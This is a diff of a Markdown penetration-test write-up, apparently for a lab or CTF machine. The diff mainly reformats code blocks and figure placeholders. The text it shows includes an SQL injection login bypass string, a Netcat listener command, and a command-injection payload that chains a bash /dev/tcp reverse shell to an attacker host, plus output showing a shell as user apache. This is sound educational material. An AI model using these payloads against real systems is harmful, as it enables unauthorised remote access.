@@ -47,25 +47,23 @@ admin' OR '1'='1
 ---
 
 ### 💻 Remote Command Execution (RCE)
-Once authenticated, the console exposed a system management utility titled *"Ping a Machine on the Network"*. Due to an HTML rendering error in legacy browsers, the interface boxes were hidden but fully active.
-
-By appending an operator payload, the system command syntax was hijacked.
+Once authenticated, the console exposed a system management utility titled *"Ping a Machine on the Network"*. Due to an HTML rendering error in legacy browsers, the interface boxes were hidden but fully active. By appending an operator payload, the system command syntax was hijacked.
 
 1. A Netcat listener was established on the attacker host to await the reverse callback:
-   ```bash
-   nc -lvnp 4444
-   ```
-   <!-- 🖼️ PLACE FOURTH IMAGE HERE -->
+```bash
+nc -lvnp 4444
+```
+
+<!-- 🖼️ PLACE FOURTH IMAGE HERE -->
 ![Initial Access Foothold](images/foothold_lvl2.png)
-```text
-*Figure 4: Successfully catching the interactive shell session using a Netcat listener.*
+*Figure 4: Setting up the Netcat listener to catch the interactive shell session.*
 
 ---
 
 2. The following unified logical payload was delivered through the command field entry parameter:
-   ```text
-   192.168.0.21 && bash -i >& /dev/tcp/192.168.0.21/4444 0>&1
-   ```
+```text
+192.168.0.21 && bash -i >& /dev/tcp/192.168.0.21/4444 0>&1
+```
 
 <!-- 🖼️ PLACE THIRD IMAGE HERE -->
 ![Command Injection Target Trigger](images/sql_command2_lvl2.png)
@@ -79,10 +77,6 @@ bash: no job control in this shell
 bash-3.00\$ whoami
 apache
 ```
-
-<!-- 🖼️ PLACE FOURTH IMAGE HERE -->
-![Initial Access Foothold](images/foothold_lvl2.png)
-*Figure 4: Successfully catching the interactive shell session using a Netcat listener.*
 
 ---
 
